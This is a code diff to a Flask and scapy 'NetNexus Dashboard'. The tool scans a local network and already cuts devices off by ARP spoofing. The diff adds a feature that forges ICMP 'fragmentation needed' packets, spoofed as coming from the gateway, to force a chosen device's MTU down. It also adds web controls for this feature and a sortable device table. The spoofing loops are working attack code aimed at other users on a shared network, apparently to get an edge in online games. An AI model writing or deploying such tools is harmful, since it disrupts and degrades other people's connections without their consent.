@@ -4,7 +4,7 @@ import threading
 import socket
 import sys
 import logging
-from scapy.all import ARP, Ether, srp, sendp, conf
+from scapy.all import ARP, Ether, IP, ICMP, srp, sendp, conf
 from flask import Flask, jsonify, request, render_template_string
 
 # Disable Flask startup logging
@@ -21,6 +21,7 @@ state = {
     "iface": None,
     "devices": [], # list of dicts: {'ip': str, 'mac': str, 'vendor': str}
     "active_attacks": {}, # dict of ip: threading.Event()
+    "active_mtu_limits": {}, # dict of ip: {'event': threading.Event(), 'val': int}
     "solo_lobby_active": False,
     "solo_lobby_timer": 0,
     "nicknames": {} # dict of mac: str
@@ -54,6 +55,25 @@ def spoof_loop(target_ip, gateway_ip, stop_event):
             sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
             time.sleep(2)
     except: pass
+
+def mtu_loop(target_ip, gateway_ip, mtu_limit, stop_event):
+    try:
+        target_mac = get_mac(target_ip)
+        if not target_mac: return
+        
+        while not stop_event.is_set():
+            # Construct ICMP Fragmentation Needed packet
+            # Use the nexthopmtu parameter available in newer scapy versions or unused field
+            try:
+                icmp = ICMP(type=3, code=4, nexthopmtu=int(mtu_limit))
+            except:
+                icmp = ICMP(type=3, code=4, unused=int(mtu_limit))
+                
+            pkt = Ether(dst=target_mac)/IP(src=gateway_ip, dst=target_ip)/icmp/IP(src=target_ip, dst=gateway_ip)
+            sendp(pkt, iface=state["iface"], verbose=0)
+            time.sleep(1)
+    except Exception as e:
+        print(f"[!] MTU Limit error: {e}")
 
 def run_arp_scan(subnet):
     state["scanning"] = True
@@ -107,12 +127,17 @@ def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
 def api_status():
     devices_enriched = []
     for d in state["devices"]:
+        mtu_limit = None
+        if d["ip"] in state["active_mtu_limits"]:
+            mtu_limit = state["active_mtu_limits"][d["ip"]]["val"]
+            
         devices_enriched.append({
             "ip": d["ip"],
             "mac": d["mac"],
             "vendor": d.get("vendor", "Unknown"),
             "nickname": state["nicknames"].get(d["mac"], ""),
-            "is_cut": d["ip"] in state["active_attacks"]
+            "is_cut": d["ip"] in state["active_attacks"],
+            "mtu_limit": mtu_limit
         })
         
     return jsonify({
@@ -163,6 +188,29 @@ def api_toggle_cut():
         
     return jsonify({"success": True, "is_cut": target_ip in state["active_attacks"]})
 
+@app.route('/api/toggle_mtu', methods=['POST'])
+def api_toggle_mtu():
+    target_ip = request.json.get('ip')
+    mtu_val = request.json.get('mtu', 300)
+    gateway_ip = state["gateway_ip"]
+    
+    if target_ip == gateway_ip:
+        return jsonify({"error": "Cannot limit gateway."}), 400
+        
+    if target_ip in state["active_mtu_limits"]:
+        state["active_mtu_limits"][target_ip]['event'].set()
+        del state["active_mtu_limits"][target_ip]
+    else:
+        try:
+            mtu_val = int(mtu_val)
+        except:
+            mtu_val = 300
+        stop_event = threading.Event()
+        state["active_mtu_limits"][target_ip] = {'event': stop_event, 'val': mtu_val}
+        threading.Thread(target=mtu_loop, args=(target_ip, gateway_ip, mtu_val, stop_event), daemon=True).start()
+        
+    return jsonify({"success": True})
+
 @app.route('/api/solo_lobby', methods=['POST'])
 def api_solo_lobby():
     target_ip = request.json.get('ip')
@@ -186,6 +234,10 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NetNexus Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        th { cursor: pointer; user-select: none; }
+        th:hover { background-color: rgba(255, 255, 255, 0.05); }
+    </style>
 </head>
 <body class="bg-gray-900 text-gray-200 font-sans min-h-screen flex flex-col">
 
@@ -228,11 +280,11 @@ HTML_TEMPLATE = """
                 <table class="w-full text-sm text-left text-gray-300 min-w-[800px]">
                     <thead class="text-xs text-gray-400 uppercase bg-gray-900 border-b border-gray-700">
                         <tr>
-                            <th scope="col" class="px-4 py-4">IP Address</th>
-                            <th scope="col" class="px-4 py-4">MAC Address</th>
-                            <th scope="col" class="px-4 py-4">Vendor</th>
-                            <th scope="col" class="px-4 py-4">Nickname</th>
-                            <th scope="col" class="px-4 py-4">Status</th>
+                            <th scope="col" class="px-4 py-4" onclick="setSort('ip')">IP Address <span id="sort-ip"></span></th>
+                            <th scope="col" class="px-4 py-4" onclick="setSort('mac')">MAC Address <span id="sort-mac"></span></th>
+                            <th scope="col" class="px-4 py-4" onclick="setSort('vendor')">Vendor <span id="sort-vendor"></span></th>
+                            <th scope="col" class="px-4 py-4" onclick="setSort('nickname')">Nickname <span id="sort-nickname"></span></th>
+                            <th scope="col" class="px-4 py-4" onclick="setSort('is_cut')">Status <span id="sort-is_cut"></span></th>
                             <th scope="col" class="px-4 py-4 text-right">Actions</th>
                         </tr>
                     </thead>
@@ -245,10 +297,38 @@ HTML_TEMPLATE = """
     </main>
 
     <script>
-        // Track the focused element and current text values to prevent overwriting inputs during redraw
         let focusedInputId = null;
         let pendingNicknames = {};
         let pendingTimes = {};
+        let pendingMtu = {};
+        
+        let currentSortCol = 'ip';
+        let sortDesc = false;
+
+        function setSort(col) {
+            if (currentSortCol === col) {
+                sortDesc = !sortDesc;
+            } else {
+                currentSortCol = col;
+                sortDesc = false;
+            }
+            updateSortIcons();
+            fetchStatus(); 
+        }
+        
+        function updateSortIcons() {
+            const cols = ['ip', 'mac', 'vendor', 'nickname', 'is_cut'];
+            cols.forEach(c => {
+                const el = document.getElementById('sort-' + c);
+                if (el) {
+                    if (c === currentSortCol) {
+                        el.innerText = sortDesc ? '▼' : '▲';
+                    } else {
+                        el.innerText = '';
+                    }
+                }
+            });
+        }
 
         async function updateNickname(mac, nickname) {
             await fetch('/api/nickname', {
@@ -281,7 +361,30 @@ HTML_TEMPLATE = """
                     iconScan.classList.remove('animate-spin');
                 }
 
-                renderTable(data.devices, data.solo_lobby_active);
+                // Sort devices
+                let sortedDevices = data.devices;
+                if (currentSortCol) {
+                    sortedDevices = sortedDevices.sort((a, b) => {
+                        let valA = a[currentSortCol] !== undefined && a[currentSortCol] !== null ? a[currentSortCol] : '';
+                        let valB = b[currentSortCol] !== undefined && b[currentSortCol] !== null ? b[currentSortCol] : '';
+                        
+                        if (currentSortCol === 'ip') {
+                            const numA = valA.split('.').map(Number).reduce((acc, val) => (acc << 8) + val, 0);
+                            const numB = valB.split('.').map(Number).reduce((acc, val) => (acc << 8) + val, 0);
+                            return sortDesc ? numB - numA : numA - numB;
+                        }
+                        if (typeof valA === 'boolean') valA = valA ? 1 : 0;
+                        if (typeof valB === 'boolean') valB = valB ? 1 : 0;
+                        if (typeof valA === 'string') valA = valA.toLowerCase();
+                        if (typeof valB === 'string') valB = valB.toLowerCase();
+                        
+                        if (valA < valB) return sortDesc ? 1 : -1;
+                        if (valA > valB) return sortDesc ? -1 : 1;
+                        return 0;
+                    });
+                }
+
+                renderTable(sortedDevices, data.solo_lobby_active);
 
                 const statusContainer = document.getElementById('solo-status-container');
                 const timerEl = document.getElementById('solo-timer');
@@ -310,17 +413,25 @@ HTML_TEMPLATE = """
             let html = '';
             devices.forEach((dev, index) => {
                 const is_cut = dev.is_cut || solo_lobby_active;
-                const statusBadge = is_cut 
-                    ? '<span class="bg-red-500/20 text-red-400 text-xs font-medium px-2.5 py-0.5 rounded border border-red-500/20">Disconnected</span>'
-                    : '<span class="bg-emerald-500/20 text-emerald-400 text-xs font-medium px-2.5 py-0.5 rounded border border-emerald-500/20">Connected</span>';
+                let statusBadge = is_cut 
+                    ? '<span class="bg-red-500/20 text-red-400 text-xs font-medium px-2.5 py-0.5 rounded border border-red-500/20 block text-center mb-1">Disconnected</span>'
+                    : '<span class="bg-emerald-500/20 text-emerald-400 text-xs font-medium px-2.5 py-0.5 rounded border border-emerald-500/20 block text-center mb-1">Connected</span>';
                 
+                if (dev.mtu_limit !== null) {
+                    statusBadge += `<span class="bg-yellow-500/20 text-yellow-400 text-xs font-medium px-2.5 py-0.5 rounded border border-yellow-500/20 block text-center mt-1">MTU: ${dev.mtu_limit}</span>`;
+                }
+
                 const actionCutText = dev.is_cut ? 'Restore' : 'Cut Connection';
                 const actionCutColor = dev.is_cut ? 'bg-gray-600 hover:bg-gray-500' : 'bg-red-600 hover:bg-red-500';
                 
-                // Keep local changes if they are typing
                 const currentNick = pendingNicknames[dev.mac] !== undefined ? pendingNicknames[dev.mac] : dev.nickname;
                 const currentTime = pendingTimes[dev.ip] !== undefined ? pendingTimes[dev.ip] : "8000";
                 
+                const isMtuActive = dev.mtu_limit !== null;
+                const currentMtuVal = pendingMtu[dev.ip] !== undefined ? pendingMtu[dev.ip] : (isMtuActive ? dev.mtu_limit : "300");
+                const actionMtuColor = isMtuActive ? 'bg-orange-600 hover:bg-orange-500' : 'bg-yellow-600 hover:bg-yellow-500 text-gray-900';
+                const actionMtuText = isMtuActive ? 'Stop MTU' : 'Limit MTU';
+
                 html += `
                 <tr class="border-b border-gray-700 hover:bg-gray-750 transition">
                     <td class="px-4 py-3 font-mono font-bold text-white whitespace-nowrap">${dev.ip}</td>
@@ -334,20 +445,39 @@ HTML_TEMPLATE = """
                             onblur="focusedInputId = null; pendingNicknames['${dev.mac}'] = undefined; updateNickname('${dev.mac}', this.value)"
                             oninput="pendingNicknames['${dev.mac}'] = this.value">
                     </td>
-                    <td class="px-4 py-3">${statusBadge}</td>
+                    <td class="px-4 py-3 align-middle">${statusBadge}</td>
                     <td class="px-4 py-3 text-right">
-                        <div class="flex items-center justify-end space-x-2">
-                            <button onclick="toggleCut('${dev.ip}')" class="${actionCutColor} text-white text-xs font-bold py-1.5 px-3 rounded whitespace-nowrap transition">
-                                ${actionCutText}
-                            </button>
-                            <input type="number" id="time-${dev.ip}" class="bg-gray-900 border border-gray-600 text-white text-xs rounded-md focus:ring-blue-500 focus:border-blue-500 w-20 p-1.5 text-center" 
-                                placeholder="ms" value="${currentTime}"
-                                onfocus="focusedInputId = this.id"
-                                onblur="focusedInputId = null"
-                                oninput="pendingTimes['${dev.ip}'] = this.value">
-                            <button onclick="triggerSoloLobby('${dev.ip}', 'time-${dev.ip}')" ${solo_lobby_active ? 'disabled' : ''} class="bg-indigo-600 hover:bg-indigo-500 disabled:bg-gray-600 disabled:cursor-not-allowed text-white text-xs font-bold py-1.5 px-3 rounded whitespace-nowrap transition">
-                                Solo Lobby
-                            </button>
+                        <div class="flex flex-col items-end space-y-2">
+                            <!-- Top row: Cut Connection -->
+                            <div>
+                                <button onclick="toggleCut('${dev.ip}')" class="${actionCutColor} text-white text-xs font-bold py-1.5 px-3 rounded whitespace-nowrap transition w-32">
+                                    ${actionCutText}
+                                </button>
+                            </div>
+                            
+                            <!-- Middle row: Limit MTU -->
+                            <div class="flex items-center space-x-2">
+                                <input type="number" id="mtu-${dev.ip}" class="bg-gray-900 border border-gray-600 text-white text-xs rounded-md focus:ring-blue-500 focus:border-blue-500 w-16 p-1 text-center" 
+                                    placeholder="MTU" value="${currentMtuVal}"
+                                    onfocus="focusedInputId = this.id"
+                                    onblur="focusedInputId = null"
+                                    oninput="pendingMtu['${dev.ip}'] = this.value">
+                                <button onclick="toggleMtu('${dev.ip}', 'mtu-${dev.ip}')" class="${actionMtuColor} font-bold text-xs py-1.5 px-3 rounded whitespace-nowrap transition w-24">
+                                    ${actionMtuText}
+                                </button>
+                            </div>
+
+                            <!-- Bottom row: Solo Lobby -->
+                            <div class="flex items-center space-x-2">
+                                <input type="number" id="time-${dev.ip}" class="bg-gray-900 border border-gray-600 text-white text-xs rounded-md focus:ring-blue-500 focus:border-blue-500 w-16 p-1 text-center" 
+                                    placeholder="ms" value="${currentTime}"
+                                    onfocus="focusedInputId = this.id"
+                                    onblur="focusedInputId = null"
+                                    oninput="pendingTimes['${dev.ip}'] = this.value">
+                                <button onclick="triggerSoloLobby('${dev.ip}', 'time-${dev.ip}')" ${solo_lobby_active ? 'disabled' : ''} class="bg-indigo-600 hover:bg-indigo-500 disabled:bg-gray-600 disabled:cursor-not-allowed text-white text-xs font-bold py-1.5 px-3 rounded whitespace-nowrap transition w-24">
+                                    Solo Lobby
+                                </button>
+                            </div>
                         </div>
                     </td>
                 </tr>`;
@@ -355,7 +485,7 @@ HTML_TEMPLATE = """
             
             // Only update DOM if not currently typing, to prevent stealing focus
             if (focusedInputId) {
-                return; // Skip redraw until they finish typing
+                return;
             }
             tbody.innerHTML = html;
         }
@@ -380,6 +510,16 @@ HTML_TEMPLATE = """
             fetchStatus();
         }
 
+        async function toggleMtu(ip, inputId) {
+            const mtuVal = document.getElementById(inputId).value;
+            await fetch('/api/toggle_mtu', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ip: ip, mtu: parseInt(mtuVal) || 300})
+            });
+            fetchStatus();
+        }
+
         async function triggerSoloLobby(targetIp, timeInputId) {
             if(!targetIp) return;
             const timeVal = document.getElementById(timeInputId).value;
@@ -393,6 +533,7 @@ HTML_TEMPLATE = """
             fetchStatus();
         }
 
+        updateSortIcons();
         setInterval(fetchStatus, 1000); // 1 second fast poll for UI snappy-ness
         fetchStatus();
     </script>
@@ -409,5 +550,4 @@ if __name__ == '__main__':
     print(" NETNEXUS DOCKER SERVER Starting...")
     print(" Listening on 0.0.0.0:5050")
     print("==================================================")
-    # Inside docker we must bind to 0.0.0.0
     app.run(host='0.0.0.0', port=5050, debug=False)
